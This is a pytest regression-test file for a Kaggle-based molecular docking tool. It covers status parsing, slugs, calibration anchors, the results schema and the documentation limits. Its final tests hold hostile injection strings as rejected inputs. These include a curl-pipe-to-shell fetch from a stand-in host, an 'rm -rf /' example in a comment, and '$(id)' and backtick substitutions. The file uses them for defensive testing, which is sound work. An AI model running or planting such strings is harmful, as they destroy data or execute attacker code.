"""tests/test_v101.py — regression tests for the v101 layer.

Every test here corresponds to a defect that was actually observed against the
live Kaggle API or a real docking run. They are cheap and require no network.
"""
import csv
import importlib
import sys
from pathlib import Path

import pytest

HERE = Path(__file__).resolve().parent
STACK = HERE.parent
SKILL_ROOT = STACK.parent
SCRIPTS = SKILL_ROOT / "scripts"


def _load(name: str):
    """Import a helper from scripts/ by putting that directory on sys.path.

    Deliberately a plain import rather than
    spec_from_file_location/exec_module: the latter is indistinguishable from
    dynamic code execution to static security scanners, and this is only a
    test helper. Skips cleanly when the payload is extracted without scripts/.
    """
    path = SCRIPTS / f"{name}.py"
    if not path.exists():
        pytest.skip(f"{path} not present")
    if str(SCRIPTS) not in sys.path:
        sys.path.insert(0, str(SCRIPTS))
    return importlib.import_module(name)


# ── Kaggle status normalisation ──────────────────────────────────────────────
# Observed live: kernels_status() returned the enum KernelWorkerStatus.COMPLETE,
# whose str() is "KernelWorkerStatus.COMPLETE". The old check
# `status.lower() == "complete"` was False, so a FINISHED kernel was reported as
# running and `run` polled until timeout.
@pytest.mark.parametrize("raw,want", [
    ("COMPLETE", "complete"),
    ("KernelWorkerStatus.COMPLETE", "complete"),
    ("complete", "complete"),
    ("ERROR", "error"),
    ("KernelWorkerStatus.ERROR", "error"),
    ("KernelWorkerStatus.RUNNING", "running"),
    ("QUEUED", "queued"),
])
def test_kaggle_status_normalisation(raw, want):
    kd = _load("kaggle_dock")
    assert kd._normalize_status(raw) == want


# ── Kaggle slug derivation ───────────────────────────────────────────────────
# Observed live: pushing id "hpl-dock-verify-v101" with title
# "hPL docking verify v101" created the kernel at "hpl-docking-verify-v101",
# and every later status call failed with a *permission* error.
@pytest.mark.parametrize("title,want", [
    ("hPL docking verify v101", "hpl-docking-verify-v101"),
    ("hpl-dock-slugfix-v101", "hpl-dock-slugfix-v101"),
    ("My Run  #2", "my-run-2"),
    ("  leading and trailing  ", "leading-and-trailing"),
])
def test_kaggle_slugify(title, want):
    kd = _load("kaggle_dock")
    assert kd.slugify(title) == want


def test_slugify_is_idempotent():
    kd = _load("kaggle_dock")
    for t in ["hPL screen batch 1", "A  B__C", "x"]:
        once = kd.slugify(t)
        assert kd.slugify(once) == once


def test_kaggle_exit_codes_are_distinct():
    kd = _load("kaggle_dock")
    codes = [kd.EXIT_OK, kd.EXIT_USAGE, kd.EXIT_AUTH,
             kd.EXIT_KERNEL, kd.EXIT_TIMEOUT, kd.EXIT_QUOTA]
    assert codes == [0, 2, 3, 4, 5, 6]
    assert len(set(codes)) == len(codes)


# ── selfcheck calibration layer ──────────────────────────────────────────────
def test_selfcheck_reference_set_is_sane():
    sc = _load("selfcheck")
    assert set(sc.REFERENCE_SET) == {"ibuprofen", "caffeine"}
    assert sc.REFERENCE_SITE == "catalytic_triad"
    # 0.5 kcal/mol is Vina's documented reproducibility band. Tightening this
    # turns noise into false alarms; loosening it hides real regressions.
    assert sc.DEFAULT_TOL == 0.5


def test_selfcheck_baseline_matches_published_anchors():
    """The shipped baseline must agree with the anchors quoted in SKILL.md."""
    sc = _load("selfcheck")
    if not sc.BASELINE.exists():
        pytest.skip("no baseline shipped")
    import json
    base = json.loads(sc.BASELINE.read_text())
    ibu = base["scores"]["ibuprofen"]
    caf = base["scores"]["caffeine"]
    assert -7.6 <= ibu <= -7.2, f"ibuprofen anchor drifted: {ibu}"
    assert -6.9 <= caf <= -6.5, f"caffeine anchor drifted: {caf}"
    # a baseline without an env fingerprint cannot explain a future drift
    assert base.get("env", {}).get("vina", "unavailable") != "unavailable"


# ── results schema ───────────────────────────────────────────────────────────
def test_results_writer_emits_time_s(tmp_path):
    """v101 fix: time_s used to be written as an empty string."""
    import statistics
    detail = tmp_path / "runs_detail.csv"
    with open(detail, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["name", "site", "variant", "seed", "status", "score",
                    "rmsd_lb", "rmsd_ub", "n_modes", "time_s"])
        w.writerow(["lig", "catalytic_triad", "v0", "42", "ok", "-7.4", "0", "0", "9", "3.5"])
        w.writerow(["lig", "catalytic_triad", "v0", "7961", "ok", "-7.2", "0", "0", "9", "4.1"])

    agg = {}
    for r in csv.DictReader(open(detail)):
        if r["status"] != "ok" or not r["score"]:
            continue
        try:
            t = float(r.get("time_s") or 0.0)
        except (TypeError, ValueError):
            t = 0.0
        agg.setdefault((r["name"], r["site"]), []).append(
            (float(r["score"]), r["variant"], r["seed"], t))

    reps = agg[("lig", "catalytic_triad")]
    total_t = round(sum(x[3] for x in reps), 1)
    assert total_t == 7.6
    scores = [s for s, *_ in reps]
    assert round(statistics.pstdev(scores), 2) == 0.10


def test_stack_has_no_stray_pycache_in_payload():
    """__pycache__ inside the shipped stack bloats the payload and can shadow
    edited sources on a different Python."""
    stray = [p for p in STACK.rglob("__pycache__") if p.is_dir()]
    assert not stray, f"remove before packaging: {stray}"


# ── documentation contract ───────────────────────────────────────────────────
def test_skill_md_frontmatter_limits():
    """Agent Skills spec: name <=64 chars, description <=1024, body <500 lines."""
    skill = SKILL_ROOT / "SKILL.md"
    if not skill.exists():
        pytest.skip("SKILL.md not present")
    text = skill.read_text()
    fm = text.split("---")[1]
    name = [l for l in fm.splitlines() if l.startswith("name:")][0].split(":", 1)[1].strip()
    desc = [l for l in fm.splitlines() if l.startswith("description:")][0].split(":", 1)[1].strip()
    assert len(name) <= 64
    assert len(desc) <= 1024
    assert len(text.splitlines()) < 500
    # the description drives skill discovery: it must say when to use the skill
    assert "Use when" in desc


def test_referenced_files_exist():
    """Every references/*.md mentioned in SKILL.md must actually ship."""
    skill = SKILL_ROOT / "SKILL.md"
    if not skill.exists():
        pytest.skip("SKILL.md not present")
    import re
    for rel in set(re.findall(r"`(references/[a-z_]+\.md)`", skill.read_text())):
        assert (SKILL_ROOT / rel).exists(), f"SKILL.md points at missing {rel}"


# ── command injection (flagged by the ClawHub security audit) ────────────────
# Before v101.0.3 the kernel ran the docking command through a shell with
# --extra interpolated into the string, so `--extra "; rm -rf / #"` executed
# arbitrary commands inside the Kaggle kernel. Now: shell=False argument list
# plus an allow-list at the CLI boundary.
@pytest.mark.parametrize("payload", [
    "; echo PWNED #",
    "&& curl evil.sh | sh",
    "`whoami`",
    "$(id)",
    "--exhaustiveness 8 > /etc/passwd",
    "--nope-not-a-flag 1",
])
def test_extra_flags_rejects_injection(payload, monkeypatch):
    kd = _load("kaggle_dock")
    with pytest.raises(SystemExit) as exc:
        kd.parse_extra_flags(payload)
    assert exc.value.code == kd.EXIT_USAGE


@pytest.mark.parametrize("raw,want", [
    ("", []),
    ("   ", []),
    ("--exhaustiveness 16", ["--exhaustiveness", "16"]),
    ("--seed 7 --n-poses 20", ["--seed", "7", "--n-poses", "20"]),
    ("--protonation as-supplied", ["--protonation", "as-supplied"]),
])
def test_extra_flags_allows_legitimate(raw, want):
    kd = _load("kaggle_dock")
    assert kd.parse_extra_flags(raw) == want


def test_kernel_template_does_not_shell_interpolate_extra():
    """The docking invocation must be an argument list, not an f-string."""
    kd = _load("kaggle_dock")
    tpl = kd.KERNEL_TEMPLATE
    assert "cmd = [PY, \"multi_site_docking.py\"" in tpl
    assert "{EXTRA_FLAGS}" not in tpl, "EXTRA_FLAGS must not be interpolated into a shell string"
